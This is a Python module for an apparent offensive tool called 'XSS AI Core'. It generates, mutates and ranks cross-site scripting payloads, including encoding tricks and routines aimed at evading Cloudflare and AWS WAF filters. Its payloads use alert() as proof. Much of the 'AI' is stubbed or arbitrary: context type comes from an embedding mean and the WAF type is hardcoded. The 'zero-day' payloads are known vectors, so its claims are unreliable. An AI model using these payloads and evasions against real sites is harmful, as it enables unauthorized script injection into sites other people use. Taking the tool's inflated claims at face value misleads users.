import numpy as np
from sklearn.ensemble import IsolationForest
import json
import re
from typing import List, Dict, Tuple
from .adversarial_fuzzer import AdversarialFuzzer
from sentence_transformers import SentenceTransformer
from transformers import AutoTokenizer
from tensorflow import keras
from transformers import pipeline

class XSSAICore:
    """
    Ultimate XSS AI Detection and Payload Generation Engine
    Combines multiple AI techniques for maximum effectiveness
    """
    
    def __init__(self, model_path=None):
        print("🚀 Initializing XSS AI Core...")
        
        # Load pre-trained or custom models
        if model_path:
            self.sentence_model = SentenceTransformer(model_path)
            self.tokenizer = AutoTokenizer.from_pretrained(model_path)
        else:
            self.sentence_model = SentenceTransformer('all-MiniLM-L6-v2')
            self.tokenizer = AutoTokenizer.from_pretrained('distilbert-base-uncased')

        # Initialize Adversarial Fuzzer
        self.fuzzer = AdversarialFuzzer()
        
        # Initialize AI models
        self.context_analyzer = self._build_context_analyzer()
        self.payload_generator = self._build_payload_generator()
        self.evasion_predictor = self._build_evasion_predictor()
        self.anomaly_detector = IsolationForest(contamination='auto')  # Use 'auto' for string type safety
        
        # Load XSS knowledge base
        self.xss_patterns = self._load_xss_patterns()
        self.waf_signatures = self._load_waf_signatures()
        
        print("✅ XSS AI Core initialized!")
    
    def _build_context_analyzer(self):
        """Build neural network for context analysis"""
        model = keras.Sequential([
            keras.layers.Dense(512, activation='relu', input_shape=(768,)),
            keras.layers.Dropout(0.3),
            keras.layers.Dense(256, activation='relu'),
            keras.layers.Dropout(0.2),
            keras.layers.Dense(128, activation='relu'),
            keras.layers.Dense(64, activation='relu'),
            keras.layers.Dense(10, activation='softmax')  # XSS context types
        ])
        model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
        return model
    
    def _build_payload_generator(self):
        """Build transformer-based payload generator"""
        return pipeline('text-generation', model='distilgpt2', max_length=100)
    
    def _build_evasion_predictor(self):
        """Build model to predict WAF evasion techniques"""
        model = keras.Sequential([
            keras.layers.LSTM(128, return_sequences=True, input_shape=(None, 100)),
            keras.layers.LSTM(64),
            keras.layers.Dense(32, activation='relu'),
            keras.layers.Dense(5, activation='softmax')  # Evasion techniques
        ])
        model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
        return model
    
    def analyze_context(self, html_content: str, url: str) -> Dict:
        """AI-powered context analysis"""
        print("🧠 Analyzing injection context...")
        
        # Extract features using sentence transformers
        embeddings = self.sentence_model.encode([html_content])
        
        # Analyze HTML structure
        structure_features = self._analyze_html_structure(html_content)
        
        # Predict injection points
        injection_points = self._predict_injection_points(html_content)
        
        # Context classification
        context_type = self._classify_context(embeddings[0])
        
        return {
            'context_type': context_type,
            'injection_points': injection_points,
            'structure_features': structure_features,
            'risk_score': self._calculate_risk_score(embeddings[0])
        }
    
    def generate_ai_payloads(self, context: Dict, target_url: str) -> List[str]:
        """Generate context-aware XSS payloads using AI"""
        print("🎯 Generating AI-powered payloads...")
        
        base_payloads = []
        
        # Context-aware payload generation
        if context['context_type'] == 'form_input':
            base_payloads.extend(self._generate_form_payloads(context))
        elif context['context_type'] == 'url_parameter':
            base_payloads.extend(self._generate_url_payloads(context))
        elif context['context_type'] == 'dom_element':
            base_payloads.extend(self._generate_dom_payloads(context))
        
        # AI-enhanced payload mutation
        mutated_payloads = self._mutate_payloads_ai(base_payloads, context)
        
        # WAF evasion prediction and enhancement
        evasion_payloads = self._generate_evasion_payloads(mutated_payloads, context)
        
        # Zero-day payload generation
        zeroday_payloads = self._generate_zeroday_payloads(context)
        
        # Adversarial and semantic fuzzing
        fuzzed_payloads = []
        for payload in base_payloads + mutated_payloads + evasion_payloads + zeroday_payloads:
            fuzzed_payloads.extend(self.fuzzer.generate_adversarial_payloads(payload))
            fuzzed_payloads.extend(self.fuzzer.semantic_fuzz_payloads(payload))
            fuzzed_payloads.extend(self.fuzzer.homoglyph_fuzz_payloads(payload))
            fuzzed_payloads.extend(self.fuzzer.unicode_fuzz_payloads(payload))
        all_payloads = base_payloads + mutated_payloads + evasion_payloads + zeroday_payloads + fuzzed_payloads
        
        # Rank payloads by AI-predicted success rate
        ranked_payloads = self._rank_payloads_ai(all_payloads, context)
        
        return ranked_payloads[:50]  # Return top 50 payloads
    
    def _generate_form_payloads(self, context: Dict) -> List[str]:
        """Generate form-specific payloads"""
        return [
            '<script>alert("XSS-AI-Form")</script>',
            '<img src=x onerror=alert("XSS-AI-Form")>',
            '<svg onload=alert("XSS-AI-Form")>',
            '"><script>alert("XSS-AI-Form")</script>',
            '\'/><script>alert("XSS-AI-Form")</script>',
        ]
    
    def _generate_url_payloads(self, context: Dict) -> List[str]:
        """Generate URL parameter specific payloads"""
        return [
            'javascript:alert("XSS-AI-URL")',
            '<script>alert("XSS-AI-URL")</script>',
            '"><svg onload=alert("XSS-AI-URL")>',
            '%3Cscript%3Ealert("XSS-AI-URL")%3C/script%3E',
        ]
    
    def _mutate_payloads_ai(self, payloads: List[str], context: Dict) -> List[str]:
        """Use AI to mutate payloads for better evasion"""
        mutated = []
        
        for payload in payloads:
            # Character encoding mutations
            mutated.append(self._encode_payload(payload, 'url'))
            mutated.append(self._encode_payload(payload, 'html'))
            mutated.append(self._encode_payload(payload, 'unicode'))
            
            # Case mutation
            mutated.append(self._case_mutate(payload))
            
            # Comment injection
            mutated.append(self._inject_comments(payload))
            
            # AI-based syntax variations
            mutated.extend(self._ai_syntax_variations(payload))
        
        return mutated
    
    def _generate_evasion_payloads(self, payloads: List[str], context: Dict) -> List[str]:
        """Generate WAF evasion payloads using AI"""
        evasion_payloads = []
        
        for payload in payloads[:10]:  # Limit for performance
            # Predict WAF type and generate evasions
            waf_type = self._predict_waf_type(context)
            
            if waf_type == 'cloudflare':
                evasion_payloads.extend(self._cloudflare_evasion(payload))
            elif waf_type == 'aws_waf':
                evasion_payloads.extend(self._aws_waf_evasion(payload))
            else:
                evasion_payloads.extend(self._generic_waf_evasion(payload))
        
        return evasion_payloads
    
    def _generate_zeroday_payloads(self, context: Dict) -> List[str]:
        """Generate potential zero-day XSS payloads using AI"""
        print("🔬 Generating potential zero-day payloads...")
        
        # AI-generated novel payload structures
        zeroday_payloads = [
            '<details open ontoggle=alert("XSS-AI-ZeroDay")>',
            '<marquee onstart=alert("XSS-AI-ZeroDay")>',
            '<video><source onerror=alert("XSS-AI-ZeroDay")>',
            '<audio src=x onerror=alert("XSS-AI-ZeroDay")>',
            '<iframe srcdoc="<script>parent.alert(\'XSS-AI-ZeroDay\')</script>">',
            '<object data="javascript:alert(\'XSS-AI-ZeroDay\')">',
            '<embed src="javascript:alert(\'XSS-AI-ZeroDay\')">',
            '<link rel=stylesheet href="javascript:alert(\'XSS-AI-ZeroDay\')">',
            '<base href="javascript:alert(\'XSS-AI-ZeroDay\')//">',
            '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id=a /><animate attributeName=d values="m0,0 0,0 0,0 c0,0 0,0 0,0 z;M0,0 0,0 0,0 C0,0 0,0 0,0 Z;M0,100 100,100 100,100 C100,100 100,100 100,100 Z;M0,0 0,0 0,0 C0,0 0,0 0,0 Z" begin=a.click></animate><click href=javascript:alert("XSS-AI-ZeroDay")>clickme</click></svg></mtext></math>',
        ]
        
        return zeroday_payloads
    
    def _rank_payloads_ai(self, payloads: List[str], context: Dict) -> List[str]:
        """Rank payloads by AI-predicted success probability"""
        print("📊 Ranking payloads by AI prediction...")
        
        payload_scores = []
        
        for payload in payloads:
            score = self._calculate_payload_score(payload, context)
            payload_scores.append((payload, score))
        
        # Sort by score (descending)
        payload_scores.sort(key=lambda x: x[1], reverse=True)
        
        return [payload for payload, score in payload_scores]
    
    def _calculate_payload_score(self, payload: str, context: Dict) -> float:
        """Calculate AI-based payload success score"""
        score = 0.0
        
        # Length scoring (shorter = better evasion)
        if len(payload) < 50:
            score += 0.2
        
        # Context matching
        if context['context_type'] in payload.lower():
            score += 0.3
        
        # Novel technique detection
        if any(novel in payload for novel in ['ontoggle', 'onstart', 'srcdoc']):
            score += 0.4
        
        # Evasion technique scoring
        if any(evasion in payload for evasion in ['%', '&#', '\\u']):
            score += 0.1
        
        return min(score, 1.0)
    
    def _classify_context(self, embedding) -> str:
        """Classify the context type based on embedding or other heuristics. Expandable for more types."""
        # Placeholder: In a real implementation, use the embedding and structure features.
        # For now, randomly assign or use simple heuristics for demonstration.
        # Expand this logic as needed for your use case.
        import random
        context_types = [
            'form_input',
            'url_parameter',
            'dom_element',
            'csp_protected',
            'waf_detected',
            'template_injection',
            'json_injection',
            'dom_xss',
            'reflected_xss',
            'stored_xss',
            'unknown',
        ]
        # Example: Use embedding mean to pick a type (for demo)
        idx = int(abs(np.mean(embedding)) * 100) % len(context_types)
        return context_types[idx]
    
    # Additional helper methods...
    def _load_xss_patterns(self):
        """Load XSS pattern database"""
        return {
            'script_tags': ['<script>', '</script>'],
            'event_handlers': ['onclick', 'onload', 'onerror', 'onmouseover'],
            'javascript_protocols': ['javascript:', 'data:', 'vbscript:']
        }
    
    def _load_waf_signatures(self):
        """Load WAF signature database"""
        return {
            'cloudflare': ['script', 'javascript', 'onload'],
            'aws_waf': ['<script>', 'alert(', 'document.']
        }

    def _analyze_html_structure(self, html_content: str):
        """Stub: Analyze HTML structure for context features."""
        return {}

    def _predict_injection_points(self, html_content: str):
        """Stub: Predict injection points in HTML."""
        return []

    def _calculate_risk_score(self, embedding) -> float:
        """Stub: Calculate risk score from embedding."""
        return float(abs(np.mean(embedding)))

    def _generate_dom_payloads(self, context: Dict) -> List[str]:
        """Stub: Generate DOM element-specific payloads."""
        return [
            '<svg onload=alert("XSS-AI-DOM")>',
            '<img src=x onerror=alert("XSS-AI-DOM")>',
            '<script>alert("XSS-AI-DOM")</script>'
        ]

    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Stub: Encode payload in various ways."""
        if encoding == 'url':
            from urllib.parse import quote
            return quote(payload)
        elif encoding == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        elif encoding == 'unicode':
            return ''.join(['\\u{:04x}'.format(ord(c)) for c in payload])
        return payload

    def _case_mutate(self, payload: str) -> str:
        """Stub: Mutate case of payload."""
        return payload.swapcase()

    def _inject_comments(self, payload: str) -> str:
        """Stub: Inject comments into payload."""
        return payload.replace('<', '<!--XSS--> <')

    def _ai_syntax_variations(self, payload: str) -> list:
        """Stub: Generate AI-based syntax variations."""
        return [payload[::-1], payload.upper(), payload.lower()]

    def _predict_waf_type(self, context: dict) -> str:
        """Stub: Predict WAF type from context."""
        return 'cloudflare'

    def _cloudflare_evasion(self, payload: str) -> list:
        """Stub: Generate Cloudflare WAF evasion payloads."""
        return [payload.replace('script', 'scr<script>ipt'), payload.replace('alert', 'a\u006cert')]

    def _aws_waf_evasion(self, payload: str) -> list:
        """Stub: Generate AWS WAF evasion payloads."""
        return [payload.replace('<', '<!--aws--> <'), payload.replace('onerror', 'onerr\u006fr')]

    def _generic_waf_evasion(self, payload: str) -> list:
        """Stub: Generate generic WAF evasion payloads."""
        return [payload.replace('=', '&#x3D;'), payload.replace('(', '&#40;')]

print("🔥 XSS AI Core module created!") 